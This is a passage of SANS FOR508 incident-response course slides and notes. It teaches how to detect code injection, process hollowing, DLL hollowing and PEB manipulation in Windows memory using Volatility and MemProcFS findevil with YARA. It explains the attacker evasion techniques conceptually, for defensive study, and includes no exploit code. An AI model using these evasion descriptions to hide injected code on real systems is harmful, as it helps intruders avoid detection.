• Best defense: ID and extraction of suspicious pages
1. Strings, YARA signature scans, antivirus
2. Have a reverse engineer validate the code

• Simple detections like orphan processes and unusual
parent processes are also commonly associated
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Attackers and defenders are in a constant battle for supremacy. As our detection tools become a threat to an
attacker’s ability to persist and accomplish their goals, we should expect they will invent countermeasures to try
to slip past our tools and techniques. Memory analysis has long been a niche capability, but as more and more
enterprises add this capability to their arsenal (either via trained forensic analysts like you or via more advanced
tools like EDR suites), attackers are going to improve their stealth. Advanced adversaries attack tools and
processes.
Code injection is a great case study for watching this interplay of countermeasures. Code injection originally
was accomplished via LoadLibrary, which our security tools became apt at watching, so more advanced tools
like Metasploit and DoublePulsar now perform advanced forms of reflective injection. As we have become
better at detecting reflective injection (via tools and techniques like those that the Volatility malfind plugin
incorporates), the next generation of malware is starting to clean up after itself. The CoreFlood botnet was some
of the first malware seen in the wild to clear its PE header after loading (it actually clears the first page, 4096
bytes, of the loaded DLL). More recently, adversary groups like APT 29 (Russia) and APT32 (Vietnam) have
employed payloads from the penetration testing tool Cobalt Strike, which can also clear its headers after loading.
The Winnti RAT employed by at least one Chinese nation-state group does the same, and it is not uncommon to
see shellcode “padded” to sit deeper in a memory section. These techniques often make code loaded from these
samples look like false positives when viewed through malfind’s very limited “preview” of the page contents
(only 64 bytes)!
The latest generation of code injection techniques are even more sophisticated. Malware authors have figured
out tricks to evade the dreaded EXECUTE _READWRITE permissions like allocating memory initially as
READWRITE and then changing the permissions later to EXECUTE_READ when execution occurs (it turns
out that the VAD tree only stores the permissions used when first allocating a memory section). The Process
Environment Block (PEB) has been under attack as it is in userland and easy for malware to manipulate.
Malware has been known to both link and unlink entries in the PEB DLL lists, and even masquerade as a
different process name and file path by changing PEB fields using PowerShell attack scripts. Advanced
techniques like patching into existing code or module stomping (overwriting the contents of a legitimate DLL in
memory) are also being used for camouflage.

118

© 2023 SANS Institute

.

118

How do we find these stealthier versions of injected code? Go deeper! Dumping the contents of suspicious
memory sections can counter techniques like header modifications, padding, and some patching. The --dump
option in malfind outputs the complete contents of any suspicious memory sections to individual files. The
image below shows dumped memory sections output by malfind (the .dmp files). The files are named
according to the offset of the injected process (Volatility 2) or the process PID (Volatility 3) and the location of
the suspicious memory page within the process memory space (the second set of hex values). These dump files
can then be analyzed by a variety of means—simple “strings”, antivirus scans, or searches for known indicators
of compromise using capabilities like YARA signatures. Of course, the most complete option is to perform a
complete code review of the memory section using reverse engineering techniques, but unfortunately that is an
expensive option (which is exactly what our adversaries are aiming for).

.

To find some of the most advanced injection techniques we will need additional tools and techniques. However,
keep in mind only a small percentage of malware actually implements the most advanced attacks. Some of the
techniques require additional privileges or are dangerous, with a propensity to crash the process or lead to
system instability. There is often a big jump from proof-of-concept code to a reliable exploit. Thus, a majority of
injection attacks still use easily detectable techniques because they are easy, stable, tested, and amazingly still
evade most security solutions. Analysis approaches like identification of strange parent/child relationships and
orphan files can also be valid detections for even many advanced injection techniques! We are preparing for the
future here, and with any luck our memory detection techniques will get even better by the time many of these
techniques become mainstream.

© 2023 SANS Institute

.

119

Understanding Process Memory

• Shareable/Mapped

Kernel Memory
(Restricted)

• Shared between other processes and DLLs

• Mapped data files

PEB

• Image Mapped

DLL

• EXE or DLL loaded by the image loader
• VAD Type: VadImageMap

DLL
DLL

• Private

EXE

• Application Data
• Stack and Heap

Heap
Stack

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

A more in depth understanding of memory can help us better detect anomalies introduced by advanced injection
techniques. Process memory is composed of three primary categories: private, shareable, and image memory.

.

Private Memory
As described, private memory is the sole domain of the process and is not mapped outside of the process.
Private memory is typically allocated with the API function VirtualAlloc and includes application data, the
process heap, and the process stack. What you should not expect to find here are executables like EXE and
DLL files. Most memory pages in private memory are instantiated with READWRITE privileges, which makes
sense for items being read and written to in the stack, heap, and data files.
Shareable Memory
Also known as “mapped” memory, this part of process memory is designated for mapping all or part of shared
files for use by the process. While data here can be shared with other processes, it is not required. Files like .dat
or .mui files are regularly present here and mapped (loaded) from files on disk. Most permissions in this part of
process memory are designated READONLY.
Image Mapped Memory
The “image” section of process memory is technically part of shareable memory but tagged differently. Files on
disk are also mapped here, as it is intended for legitimately loaded executables (image binaries), DLLs, and
drivers. This is the one area of process memory where execute permissions regularly occur, though the vast
majority of image mappings use EXECUTE_WRITECOPY (copy on write is a protective mechanism for shared
code) and EXECUTE_READ privileges instead of the commonly abused EXECUTE_READWRITE.
Other items of note on the slide diagram are the Process Environment Block (PEB) is located in process memory
(making it relatively easy for malware to manipulate), and kernel memory is also present.[1] Kernel memory
houses process items like memory pools (often taken advantage of by the Volatility “scanning” plugins) the
VAD tree and page tables. We will use more of these structures shortly.

120

© 2023 SANS Institute

.

120

Clearly, process memory is stringently delineated, and our detection tools can use these well-known divisions to
identify more advanced injection. As we have already discussed, many injection techniques, including reflective
injection and process hollowing, leave behind EXECUTE_READWRITE permissions, which are not normal in
any part of process memory. Researcher Forrest Orr performed statistical modelling of memory locations in
Windows 10 and found .24% of Private Memory, .014% of shareable memory, and .01% of image memory
contained normally occurring RWX memory pages. Those are astoundingly low percentages and show why it is
such a strong indicator of evil.[2] But word is out, and attackers have discovered ways to use (or change)
permissions to the more common EXECUTE_READ. But is that effective against a properly instrumented
detection tool? The same research showed .62% of private memory with RX privileges, .036% of shareable
memory, and 17.5% of image memory. Clearly seeing executable permissions outside of image mapped
memory locations should be investigated! Most process hollowing techniques (other than process
doppelganging) require having the malicious executable in private memory, a location that simply should not
have executable code. Even process doppelganging, perhaps the most advanced version of injection, leaves
executable code in shareable memory, not image memory where true executables belong.[3] The best code
injection detection tools work by understanding what is normal and rare in process memory.

hi

de

01

.ir

[1] Surveying the User Space Through User Allocations: https://for508.com/dk5wm
[2] Masking Malicious Memory Artifacts: https://for508.com/bovq1
[3] Process Doppelganging – A New Way to Impersonate a Process: https://for508.com/zwo4i

© 2023 SANS Institute

.

121

MemProcFS FindEvil Detections

Process Irregularities:
PROC_NOLINK

Process not in the EPROCESS doubly-linked list

PROC_PARENT

Unexpected parent for process (limited checks on well-known processes)

PROC_USER

Process token indicates unexpected user account context

Unusual Memory Pages:
PE_INJECT

DLL/EXEs files present not mapped to “image” memory

NOIMAGE_RWX/RX

Executable pages present not mapped to “image” memory

PRIVATE_RWX/RX

Executable pages present in private process memory (data, stacks, heaps)

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Taking what we now know about process memory, we can now better understand some of the new detections
available in the memory analysis tool, MemProcFS. Detections are currently all rolled into a single plugin,
named “findevil.” This plugin does not run by default and must either be triggered via the commandline
with the “-forensic” argument or by writing the value “1” in the file M:\forensic\forensic_enable.txt after
MemProcFS is running. It is also important to note that this feature can only be enabled for Windows 10+
systems due to an effort to limit false positives. Once enabled, a text report named M:\forensic\findevil.txt is
generated, marking any suspicious areas of memory with the flags seen on this slide. The first set are intended
to identify common process irregularities, all of which were covered in previous steps of our memory analysis
process: [1]
PROC_NOLINK: A process that is not present in the EPROCESS doubly-linked list. This could be due to
process termination, memory image issues, or an indicator of a maliciously unlinked process.
PROC_PARENT: Checks for deviations from the commonly expected parents of some system processes
PROC_USER: Checks for processes named as system components running with the wrong account token
The next set of findevil flags focus on unusual properties of memory pages. A strong understanding of
process memory layout helps with interpretation of these events:
PE_INJECT: Memory location with a PE header (EXE/DLL) not present in image mapped memory. This is a
close analog to filtering Volatility malfind plugin output for “MZ” headers.
NOIMAGE_RWX: Memory sections with RWX permissions outside of image mapped memory.
NOIMAGE_RX: Memory sections with RX permissions outside of image mapped memory
PRIVATE_RWX: Memory sections with RWX permissions in private memory
PRIVATE_RX: Memory sections with RX permissions in private memory
These detections are extremely powerful, because while it is trivial to inject code, getting it in the proper
location with the proper dressing turns out to be extremely difficult. These detects are layered and many may
trigger on the same bad location. As an example, a “MZ” header found in a RX section outside of image
mapped memory would flag PE_INJECT and NOIMAGE_RX. The “private” flags are important because it is
even less likely to see legitimate executable flags in that part of process memory, yet some injection techniques
122

© 2023 SANS Institute

.

122

target places like the stack or heap, which are located in private memory. NetTraveler is a prolific real-world
malware family that maps executable code to RX sections in private memory. Cobalt Strike beacons also
frequently have this tell-tale sign. All in all, these detections are a major step up from those found in Volatility
malfind, but managing large numbers of false positives is still a problem.
While reviewing FindEvil (and various other output files in MemProcFS) you might see various flags that
describe the type of memory page the results came from. These are not always critical to finding evil but can
give you an idea of whether a given page was currently in memory or possibly part of the page file.
A = Active Page
T = Transient Page (non-active but still in-memory)
Z = Zero page
C = Compressed Page (this may or may not be backed by memory or paged out to the pagefile)
Pf = Pagefile

.

[1] FS_FindEvil - MemProcFS Wiki: https://for508.com/9roj0

© 2023 SANS Institute

.

123

MemProcFS FindEvil Example (Emotet)

PhoneCallHistoryApis.exe has multiple suspicious
memory locations
• PE_Patched is a false positive
• (4) RWX pages not in image memory
• (1) RX page not in image memory

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

In this system infected with the Emotet trojan, a suspicious process named PhoneCallHistoryApis.exe was
identified (the file name is cut off in the output because of the name size limitation within the EPROCESS
block).[1] A subsequent review of the MemProcFS findevil output gives further encouragement that this
process may in fact be evil. Five memory pages were identified with executable permissions outside of the
normal “image mapped” memory locations. As previously discussed, this is unusual, and these memory
locations should be extracted and further analyzed. The PE_PATCHED alert is a false positive due to normal
memory modifications caused by 32-bit code (SysWOW64) execution. But if you were unsure, you could also
extract and review the associated DLL. Notice that in this example we reviewed findevil information for just
a specific process. Alternatively, it can be reviewed for all processes via the file:
M:\forensic\findevil\findevil.txt
[1] Emotet Malware - CISA: https://for508.com/3d5vm

124

© 2023 SANS Institute

.

124

3. Uncover Kernel and Userland Process Inconsistencies

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

125

.

The most advanced code injection techniques today are directly manipulating memory structures to blend in and
defeat many of the detection techniques previously discussed. This includes changing permissions after initial
allocation, changing pointers to execute different code from what was loaded as seen in process hollowing, and
even direct manipulation (patching) of legitimately loaded code. The good news is this is still detectable. The
bad news is we need to go even deeper into process internals to take advantage of these detections. We will be
taking advantage of the fact that memory objects are tracked in several different memory structures. By
comparing these disparate information sources, we can identify inconsistencies.
Many current techniques in this class attack the Process Environment Block (PEB). This critical part of the
process happens to be stored in the user-accessible (userland) part of process memory making it easy to modify
(assuming you already have the requisite privileges to inject code). Memory locations can be unlinked from the
three loaded DLL lists to hide them from tools like Task Manager or PowerShell commands. Alternatively,
some malware attempts to add itself to these lists to better blend in (items are only legitimately in these lists
when the Windows loader is used). Techniques like PEB Masquerading can also be used to change the
command line and executable path to spoof a different name or location for the loaded code.[1]
The process VAD tree and Page Table Entries are located in the Kernel, making them much more difficult to
manipulate. Direct Kernel Object Manipulation (DKOM) attacks have been proposed to unlink and hide specific
memory locations tracked by the VAD, but kernel changes are dangerous and often end in system instability.
Even if such an attack did occur, page table entries (PTE) are the ground truth for memory allocations and could
be easily used to identify gaps in the VAD tree. Attacks against page table entries have been seen in the wild,
most notably, the use of a legitimate Windows API function, NtProtectVirtualMemory, to change page
permissions. This PTE-based attack allows attackers to allocate memory with RW permissions, copy code to
that location, and then switch the permissions to RX for code execution. However, the VAD tree also tracks
page permissions and has the unique property of only storing the original page permissions, making it a perfect
place for comparisons to be made.[2] This slide shows some of the most important values stored in the PEB,
VAD, and PTE memory structures. Comparisons of the duplicative information available are critical to our
ability to detect advanced manipulations.
[1] Mitre ATT&CK Process Argument Spoofing: https://for508.com/e7j83
[2] Detecting Hidden Injected Code by Examining Page Table Entries: https://for508.com/dq2fg
© 2023 SANS Institute

.

125

Uncovering Process Inconsistencies: windows.ldrmodules

Purpose
• DLLs are tracked in three different linked lists in the PEB for each
process. Code injection attacks often leave DLLs unlinked. This
Volatility plugin queries each list and displays the results for comparison.

Important Parameters
• Show information for specific process IDs (--pid)

Investigative Notes

• DLLs loaded via the legit Windows API will be present in all three lists
• Common false positives:
• The process executable will not be present in the "InInit" list
• Non-EXE/DLL files present in image mapped memory (.fon, .mui, .winmd)
• Some legit DLLs can be present in process memory without being loaded
• Volatility 3 often marks SysWOW64 DLLs as not loaded

• Missing "MappedPath" information is another a sign of injection
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

126

.

This plugin is a great example of the ability of Volatility to bring multiple different data sources together to aid
analysis. In this case, we are looking for suspiciously loaded code in a process, and it turns out there are multiple lists
we can compare to help us make a determination. Each process contains a Process Environment Block (PEB), which
among other things, contains three doubly linked lists for tracking a process’s loaded DLLs. In most cases, these lists
contain the same data, just ordered in different ways. Further, this information is cross-referenced with image memory
mapped pages tracked in the VAD to look for inconsistencies. The following information is provided by this plugin:
•
•
•
•
•
•
•

Process ID (PID)
Process Name (Process)
Base Address within Process from VAD tree (Base)
PEB InLoadOrderModule List (InLoad)
PEB InInitializationOrderModule List (InInit)
PEB InMemoryOrderModule List (InMem)
Mapped path on disk from VAD tree (MappedPath)

A legitimately loaded DLL will be present in each list (marked “True”) and have a mapped location on disk.
Deviations from this pattern should be investigated. As always, false positives are common. One example is each
process executable (e.g., lsass.exe) will be missing in the InInitializedOrder list as executables are not initialized in the
same way as DLLs. There are also many special files that are mapped into image mapped memory but are not real
EXE/DLL files. These include .fon, .mui, .winmd, and .msstyles file. Since they are not loaded DLLs, they are not
represented in the PEB lists. It is also possible to find legitimate DLLs mapped into process memory that have not yet
been used (loaded) or have been subsequently unloaded. These will be present in the VAD MappedPath but not in the
PEB lists. Finally, we have noticed Volatility 3 marking SysWOW64 DLLs as “FALSE” in the PEB lists which could
be due to 32-bit loaded libraries being tracked differently. We regularly run ldrmodules in both versions 2 and 3 of
Volatility as a double-check.
If you do not see any information in the "MappedPath" column, it is an indication that the DLL was not loaded from
disk as we would expect from legitimately loaded code using the Windows API (hence, there is no full path
information). When this is encountered, it is usually a sign of DLL injection, even if the unnamed DLL is present in
the PEB lists.
Equivalent plugin in Volatility 2: ldrmodules ("-v" flag provides full path information)
126

© 2023 SANS Institute

.

ldrmodules Data Sources
svchost.exe

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

127

Here we see a visual representation of data provided by the ldrmodules plugin.

•
•
•

InLoadOrderModule List
InInitializationOrderModule List
InMemoryOrderModule List

.

Recall that each process is represented by an EPROCESS block. This block has a link to a Process Environment
Block (PEB), which among other things, contains three doubly linked lists for tracking a process’s loaded DLLs.
In most cases, these lists contain the same data, just ordered in different ways. The three lists are:

Unlinking a DLL from one or more of these lists is a simple means for malware to hide injected DLLs. There is
no disruption to the process execution, but any tools used to view the loaded DLLs (like the Volatility plugin
dlllist or the system Task Manager and command line tools) will not show the unlinked DLL. Because the
PEB is a userland data structure, unlinking only requires Administrator credentials, not System or kernel access.
If an injection technique does not use the Windows loader, the loaded code will not be present in the PEB lists
but may be present in the VAD reporting. These types of mismatches provide an excellent means to detect many
different injection techniques.
Instead of just reporting what is listed in the process DLL linked lists, ldrmodules works by identifying all
image mapped memory executable areas in the VAD tree. It then compares the results with information present
in the three process PEB lists. A "True" within a column means the DLL was present, and a "False" means the
DLL was not present in the list. By comparing the results, we can visually determine which DLLs might have
been unlinked or suspiciously loaded, and hence malicious.
The example on this slide is a normal entry present within a wininit.exe process. The DLL was mapped from
\Windows\System32\ntmarta.dll and is present in each of the three PEB lists tracking loaded DLLs.

© 2023 SANS Institute

.

127

Detecting Code Injection: ldrmodules (Stuxnet)

Two suspicious regions identified within lsass.exe
• Memory section 0x80000 is not present in any of the three PEB lists and
not mapped to disk (sign of code injection)
• Memory section 0x1000000 should be the executable, but is not mapped
to disk (sign of process hollowing)
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

Stuxnet employs multiple forms of DLL injection, including a more specialized version of injection named
process hollowing. Here we ran ldrmodules on one of the potentially injected processes in our sample
image to uncover additional information (lsass.exe PID: 868). Interestingly, two entries were returned with no
MappedPath information. This commonly means that the contents of those memory sections were not loaded
via the Windows API (where all code must be loaded from disk) and thus were potentially injected from
memory into the process. By not writing to disk, malware can attempt to evade antivirus and forensic analysis.
Having no MappedPath is a strong enough clue, but we also see that the DLLs are missing from multiple
linked lists in the process environment block (PEB). Section 0x80000 is not present in any lists and is a good
example of what we would see for an injected DLL. Section 0x1000000 is present in all but the InInit list.
Note that every process will have this same anomaly, as the process executable is not present in the InInit list
by definition (that list will always show “False” for the process executable). However, the fact that it does not
have a MappedPath on disk is very suspicious (the MappedPath for this process should be
\WINDOWS\system32\lsass.exe). It turns out that this is an artifact of process hollowing: The legitimate
executable for this process (lsass.exe) was unmapped so that new code could take its place. Because this all
took place in memory, there is no corresponding file on disk representing the new contents of the process
executable (this is by design since code on disk is at greater risk of being flagged by host-based security tools).
If you were to match the findings on this slide with what malfind reports regarding injected sections (using
the Base address), you would see both tools correctly identify these memory sections as suspicious.
Ldrmodules simply gives us an alternate way to identify suspicious memory sections in a process. Another
advanced use for this plugin is to compare the Base address provided by ldrmodules for a suspicious
executable or DLL with the offset provided by the dlllist plugin. Ldrmodules extracts this data from
the VAD tree (kernel memory) while dlllist uses information in the PEB (userland and more easily
manipulated). Several process hollowing techniques can be detected in this fashion and detection is automated
in the Volatility 2 plugin HollowFind, by Monnappa K A.[1]
[1] Detecting Deceptive Process Hollowing Techniques: https://for508.com/k37dt

128

© 2023 SANS Institute

.

128

MemProcFS FindEvil Detections (1)
Process not in the EPROCESS doubly-linked list

PROC_PARENT

Unexpected parent for process (limited checks on well-known processes)

PROC_USER

Process token indicates unexpected user account context

PE_INJECT

DLL/EXEs files present in non-image memory pages

NOIMAGE_RWX/RX

Executable pages present not mapped to a DLL/EXE location

PRIVATE_RWX/RX

Executable pages present in private process memory (data, stacks, heaps)

PEB_MASQ

Image binary path mismatch in PEB and VAD (indicates PEB
modification)

PE_NOLINK

DLL present in VAD, but not linked in PEB lists. High false positives.

PE_PATCHED

DLL modified after load time. Many false positives in 32-bit and JIT code

Unusual
Kernel/PEB
Process
Irregularities Memory Pages Inconsistencies

PROC_NOLINK

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics 129

The MemProcFS findevil plugin has another set of plugins more oriented towards identification of
manipulated memory structures.

.

PEB_MASQ targets Process Environment Block masquerade attacks where the PEB is modified to change the
name and/or file path of the original loaded code. Detection is accomplished simply by comparing information
between the PEB and the VAD tree for the same image memory section.
PE_NOLINK performs detection with information similar to the Volatility ldrmodules plugin. A hit with
this detection indicates a DLL with a PE header is present in a memory section tracked by the VAD tree but is
not present in the PEB lists. This can identify many different types of process injection but will also return false
positives as discussed with ldrmodules. MemProcFS reports that many false positives are caused by paged
memory or corrupted PEB structures, so including a page file with your analysis can decrease false positives.
PE_PATCHED aims to locate executable pages that have been "patched“, or modified, after executable code is
loaded. Some of the most advanced hollowing techniques have moved in this direction since it can provide the
ultimate form of hiding within a legitimately loaded process. In-memory code is also often patched for things
like Windows Defender AMSI evasions. Luckily, page table entries (PTE) track modified pages, via structures
called prototype PTEs. MemProcFS checks each active image memory page in the VAD with any prototype
PTEs indicating modification. While this is a powerful and necessary check, it can report extensive false
positives on some systems. Luckily many of these can be planned for since they often occur with SysWOW64
32-bit code loaded and with code running just in time (JIT) compilers like .NET. Of course, a lot of code in
Windows is .NET (including PowerShell), so expect a lot of noise!
While these three plugins are heavily influenced by cross-referencing of disparate memory structures, they are
not the only ones within findevil to do so. PE_INJECT, PRIVATE_RWX/RX and NOIMAGE_RWX/RX
all used PTE information since it often represents the closest to ground truth. Overall, this makes findevil
much more effective at finding injected code than the Volatility project. However, the limitations of Volatility in
this area have not gone unnoticed and there have been some excellent third-party plugins released to fill in the
gaps. One of the best for Volatility 3 is ptemalfind by Frank Block. As the name suggests, it also relies
upon the ground truth of page tables to identify more advanced forms of injection and Block’s research almost
certainly informed the capabilities now present in MemProcFS.
© 2023 SANS Institute

.

129

MemProcFS FindEvil Detections (2)

• A DLL hollowing attack in sdev.exe (unlinked DLL in PEB)
• notepad.exe shows evidence of reflective injection

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This memory example demonstrates two different forms of injection. MemProcFS findevil reports two
different affected processes. The process notepad.exe gives multiple indications of RWX pages in private
memory (a rare event as previously discussed) along with a memory section containing a PE header present in
private memory (PE_INJECT). That combination likely indicates some sort of reflectively loaded code and
should be investigated. As an aside, this combination of indicators should also be detected with a tool like
Volatility malfind. The PE_NOLINK flag for sdev.exe indicates a different type of attack: a section within
that process’s image memory space has a PE header but is not being tracked in the PEB lists. We would
document the virtual address and any description information for further investigation, particularly if we were
already suspicious of that process. This particular attack was an advanced form of hollowing coined “DLL
hollowing.” In this type of attack, a legitimately loaded DLL is targeted, and its code section is swapped with
malicious code.[1] The Windows API function facilitating this does not have a mechanism to link the new DLL
in the three PEB lists and hence it was detected as a PE_NOLINK hit. The location modified is
0x00007fff7b5e0000. Notice how Volatility ldrmodules also reports this memory section as assigned to
“aadauthhelper.dll”, but not in any of the PEB lists. That is because this DLL is no longer aadauthhelper.dll and
has been hollowed to run new code! That particular DLL is fairly large making it a good candidate for
hollowing (the allocated memory of the targeted DLL must be greater in size than the copied exploit).
Column labels in MemProcFS findevil can be a bit challenging to decipher due to the fact that multiple data
sources are all brought together. The “Description” column can contain everything from a simple file name as
seen on this slide, to a large set of data about a memory section. If output is the latter, the following list from the
MemProcFS wiki can help you decipher the various columns of information:
(Record) Number, PID, Process, Type, Virtual Address, Offset:Bytes, Physical Address, PTE Flags,
VADVirtAddr VADPhyAddr, VadPTE, VadFlagsType, VadName
This output is designed to provide information from various memory structures. PID, Process, Type,
VirtualAddress, and VadName are the most useful. Comparisons of PTE Flags and VadFlagsType can also be
interesting to detect permissions changes (but keep in mind that many normal changes occur as well).
This example is from a test memory image created by Frank Block in support of his excellent research (process
name changed): https://for508.com/odhpi
[1] DLL Hollowing: https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing
130

© 2023 SANS Institute

.

130

MemProcFS FindEvil + YARA

• MemProcFS can YARA scan memory objects
• Built-in signatures: -license-accept-elastic-license-2.0
• Custom signatures: –forensic-yara-rules <file>

• Built-in results populate FindEvil output file
• Custom YARA hits are in M:\forensic\yara

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

131

.

One of the most exciting upgrades to MemProcFS is the addition of YARA signature scanning. Marrying the
power of YARA signature detection with detailed memory analysis can make it trivial to detect even extremely
stealthy malware variants. When enabled, YARA hits are placed at the top of the FindEvil output, which is
fitting since they often serve as the initial detections which guide you to dig deeper into specific processes.
YARA scanning has recently been expanded to also include file objects, with a goal of better identification of
threats like loaded bad or vulnerable drivers. Enabling this capability could not be easier. Ulf Frisk has preloaded the open-source Elastic Security GitHub repository of over 1000 YARA rules.[1] Each rule can detect
multiple variants of the most frequently seen malware on the planet. To use these rules, you must accept the
Elastic license by adding the following argument:
MemProcFS.exe -forensic 1 memory.img -license-accept-elastic-license-2.0
Enabling this feature will cause a delay in the availability of the forensic results for the memory image. YARA
scanning takes time, especially on large memory images. Be patient and within several minutes, results should
show up in the M:\forensic folder. Built-in YARA hits are integrated with the standard FindEvil output in
M:\forensic\csv\findevil.csv. Hits are divided into multiple “YR_*” categories as seen on this slide. The
description for each hit is sourced from the YARA rule itself, which can be used as a search term if you wish to
identify exactly how the rule was written (excellent for investigating false positives or bad rules). A separate
M:\forensic\yara.csv file is also generated providing more details on each hit, cross-referenced by the index
value in square brackets “[3]” within the FindEvil file. The example on this slide shows an interesting example
of an impressive number of hits for a single process. How could this even be possible? If you were thinking it
might be matching on an anti-virus process, you are correct! NisSrv.exe is the Microsoft Network Realtime
Inspection Service. For this reason, some processes like MS Defender MsMpEng.exe are excluded by default.
If you wish to use your own YARA collection, you can point MemProcFS at a single rule or a yara rule index
file using the –forensic-yara-rules command-line parameter. Any hits will populate in a separate
folder, M:\forensic\yara. The “match-count.txt” file will report on how many total matches were found and the
“result.txt” file will contain the hits for review, with process information if applicable.
[1] Elastic Security YARA rules: https://for508.com/bupqv

© 2023 SANS Institute

.

131

.
132

© 2023 SANS Institute

.

MemProcFS FindEvil Next Steps

• Suspicious memory can be the final clue that a
process is bad, and the system is compromised
• Cross-reference with process details and network activity

• Document virtual addresses and VAD paths
• Extract corresponding memory section(s)
• files and vmemd folders
• Include page file, if possible

• Analyze offline
• Malware scans, reversing
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

133

.

A logical question after potentially identifying injected code, is “what next?” Given the likelihood of false
positives, you will often need to perform further validation of the offending memory sections before being 100%
confident of a compromise. Though in some cases the totality of the evidence at this stage of our investigation
provides enough information. If you find a svchost.exe process running from the wrong folder, with the wrong
parent, and exhibiting signs of process hollowing, you can likely be assured it is malware. Perhaps that is all
you need to prove. If you do need to go deeper, the good news is memory analysis tools will allow you to go as
deep as necessary, unlike many host-based security products!
While performing your investigation, take good notes and in this step that means documenting process names,
the virtual addresses of possibly injected memory, and path information gleaned from the VAD (all of this is
present in MemProcFS findevil output). Next it is time to attempt recovery of those memory sections for
further analysis. This is edging into the final step of our memory analysis process, “Dump suspicious processes
and drivers”, but is worth a quick discussion now. MemProcFS automatically attempts to reconstruct files
loaded into memory using multiple different data sources. The first stop should be drilling into the process of
interest and finding the “files” folder. This folder will have sub-folders containing files reconstructed using
handles information, modules information (DLLs, EXEs, and drivers), and extracted VAD pages.
The “vmemd” folder for each process represents files and memory segments based on the process memory map.
This can be a good place to look if the memory location of interest is not mapped to an actual file and is instead
something like injected shellcode. Memory sections in the “vmemd” folder are represented as “.vvmem” files
and can be copied out for further analysis or opened directly in something like a hex editor. Your goal is to find
a match with the virtual or object name of interest within these folders. In the example on this slide, you will
notice a hit for the address of the previously discovered hollowed DLL (_NOTLINKED-0x7fff7b5e0000.dll).
File recovery in memory is not guaranteed with memory corruption and items paged out during acquisition
being the prime culprits. MemProcFS has the incredibly important feature of also providing a page file for
analysis and you will find doing so greatly increases your odds of recovery. Should you be successful, the final
step is to analyze the file or memory section using standard reverse engineering techniques: strings, YARA or
antivirus scans, tools like PEStudio, and if necessary, reversing the code using a disassembler.

© 2023 SANS Institute

.

133

MemProcFS FindEvil False Positives

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

No one ever said memory forensics would be easy! While our tools provide an impressive amount of
information and often point us in the correct direction, there simply is no substitute for a trained analyst. By now
it is clear that memory is complicated, and there can be seemingly normal activity that is suspicious and initially
suspicious activity that turns out to be normal. Added to this complexity are the actions malware authors take to
blend in and subvert our tools and techniques. We have already discussed managing false positives in Volatility
malfind, and the MemProcFS findevil plugins are no different. Sadly, at the memory page level there are
a lot of oddities! The findevil output present on this slide comes from a system infected with SolarMarker
malware. However, everything present in the output are false positives. You might first cross-reference the
process names and PIDs with any suspicious processes found in early memory forensic steps. Here we largely
see normal Windows processes. Then review the category of the finding to determine if it has a low or high
likelihood of false positives (MemProcFS does a good job of documenting which categories are error prone).
PE_PATCHED is a great example as it generates a large number of false positives.[1] We can even see many of
the reasons here. It turns out that certain code can be legitimately loaded and changed under normal conditions.
.NET is famous for this with its just-in-time (JIT) compilation during runtime. You can see evidence of this via
the folder names (e.g., Microsoft.NET) and the .NET libraries being loaded (e.g., System.Core.ni.dll and clr.dll).
Thus, processes relying upon .NET often generate many false positives. This includes PowerShell and many
other applications like Microsoft Outlook. Web browsers also often use JIT compilation techniques. Another
common generator of PE_PATCHED false positives occurs during the loading of 32-bit code via the
SysWOW64 components of Windows. Interestingly, while this findevil output for this SolarMarker
infection only consists of false positives, it does still provide clues of places to look deeper. Certainly, any use of
PowerShell should always be investigated during advanced attacks and apparently the 32-bit version
(SysWOW64) of PowerShell is in play, which is even more likely to be malicious. We also see the 32-bit
version of msiexec.exe running. While this could be normal, msiexec.exe is also commonly used to execute
code and should be investigated.
While the number of potential false positives is large, many common findings can be predicted and prepared for.
It is a great best practice to run malfind and findevil on a good baseline image so you can anticipate
strange things that are normal for that version of the operating system. Learning what is normal can greatly
speed the process of finding evil in the future.
[1] https://github.com/ufrisk/MemProcFS/wiki/FS_FindEvil
134

© 2023 SANS Institute

.

134

Look for Evidence of Code Injection Review
• Code injection is a very popular means for malware to
hide and launder its activities
• Three common injection methods are:
• Simple DLL Injection
• Reflective Code Injection
• Process Hollowing

• Identifying processes with injected memory sections is
difficult in disk-based forensics, but much more feasible
using memory analysis
• ldrmodules shows evidence of unlinked/unmapped DLLs
• malfind identifies and dumps suspicious memory sections and processes
• MemProcFS findevil detects a large number of common and advanced
injection techniques
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

135

Although code injection can be a very advanced malware topic, this section demonstrates that with the right
tools and techniques even the most advanced variants can be identified. This is one reason advanced attackers
have resorted to techniques like living off the land and hiding in plain sight; sometimes the extra complexity of
attacks like injection actually causes more problems than solutions.

.

In Volatility, we explored several detection techniques using a combination of the ldrmodules and malfind
plugins. Several third-party upgrades have been added to that project that we did not have time to dig into here
but are worth exploring: hollowfind, and threadmap in Volatility 2 and ptemalfind in Volatility 3. All
three of these plugins have excellent documentation provided by their creators. The second tool introduced,
MemProcFS, currently has some of the best and most user-friendly injection detection capabilities available.
Understanding how both tools find evil will pay dividends when using these tools, and when you see similar
alerts from other tools in the future.

© 2023 SANS Institute

.

135

Lab 3.3
Code Injection
Average Time: 40 Minutes

FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

.

This page intentionally left blank.

136

© 2023 SANS Institute

.

136

Step 5:
Audit Drivers and
Rootkit Detection
FOR508 | Advanced Incident Response, Threat Hunting, and Digital Forensics

137

.

This page intentionally left blank.

© 2023 SANS Institute

.

137

Rootkit Evolution

USERLAND
Patching, Import Address Table, Inline

Endpoint
Security

KERNEL

Driver
Signing

HYPERVISOR BOOTKITS

Secure
Boot

IDT, SSDT, DKOM, Driver IRP

